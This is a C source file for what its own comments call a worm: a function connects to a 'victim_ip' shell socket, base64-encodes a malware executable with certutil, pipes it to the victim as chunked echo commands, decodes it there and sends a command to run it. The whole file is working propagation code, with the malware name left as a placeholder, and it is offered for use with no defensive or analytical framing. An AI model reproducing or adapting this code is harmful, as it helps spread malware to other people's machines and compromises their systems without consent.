// return value:
// 0 : success
// 1 : error sock
#include "Base64P2P.h"
int Base64P2P(char *victim_ip,int port){
	int len;
	int sizeof_sa;
	int ret;
	u_long opt;

	char cmdstr[0x200];
	struct sockaddr_in target_ip;
	struct sockaddr_in sa;
	int fd;

	if ((fd=socket(AF_INET,SOCK_STREAM,0)) == -1)
		return 1;

	memset(&target_ip, 0, sizeof(target_ip));
	target_ip.sin_family = AF_INET;
	target_ip.sin_port = htons(port);
	target_ip.sin_addr.s_addr = inet_addr(victim_ip);
	if (target_ip.sin_addr.s_addr == SOCKET_ERROR)
		return 1;
	if (connect(fd, (struct sockaddr*)&target_ip, sizeof(target_ip)) == SOCKET_ERROR)
		return 1;


	sizeof_sa = sizeof(sa);
	getsockname(fd, (struct sockaddr*)&sa, &sizeof_sa);

	Sleep(1000);
	printf("command\n");
	static const char filename[] = "[malName].txt";
	// Chuyển worm trực tiếp dùng base64 
	//kiểm tra nếu file tồn tại hay không
	
	if( _access( filename, F_OK ) != -1 ) {
	} else {
    	system("certutil -encode [malName].exe [malName].txt");
	}
	
	FILE *file = fopen ( filename, "r" );
	char line[128]; /* or other suitable maximum line size */
	int i=0;
	line[0]='\x00';
	cmdstr[0]='\x00';
	char temp[0x200];
	while ( (fgets ( line, sizeof line, file ) != NULL) ) /* read a line */
	{
		
		int l1,l2;
		l1=strlen(cmdstr);
		l2=l1+strlen(line)+20;
		// printf("%x\n", l2);
		if(l2<0x200){
			line[strlen(line)-1]='\x00';
			strcat(cmdstr,line);
			strcat(cmdstr,">>test.b64&echo ");
		}
		else{
			line[strlen(line)-1]='\x00';
			strcpy(temp,"echo ");
			strcat(temp,cmdstr);
			strcpy(cmdstr,temp);
			strcat(cmdstr,"\r\n");
			if (send(fd, cmdstr, strlen(cmdstr), 0) <= 0)
				goto closesocket_and_return;
			printf("%s\n",cmdstr);
			cmdstr[0]='\x00';
			strcpy(cmdstr,line);
			strcat(cmdstr,">>test.b64&echo ");
		}
	}
	//for the last lines
	strcpy(temp,"echo ");
	strcat(temp,cmdstr);
	strcpy(cmdstr,temp);
	strcat(cmdstr,"\r\n");
	printf("%s\n", cmdstr);
	if (send(fd, cmdstr, strlen(cmdstr), 0) <= 0)
		goto closesocket_and_return;
	fclose ( file );
	sprintf(cmdstr,"certutil -decode test.b64 [malName].exe[malPass]\r\n");

	if (send(fd, cmdstr, strlen(cmdstr), 0) <= 0)
		goto closesocket_and_return;
	//Wait 20 seconds for the victim to request the file,
	// Sleep(20000);
	sprintf(cmdstr, "[malName]\r\n");
	if (send(fd, cmdstr, strlen(cmdstr), 0) <= 0)
		goto closesocket_and_return;
	Sleep(2000);


	closesocket_and_return:
	if (fd != 0)
		closesocket(fd);
	return 0;
}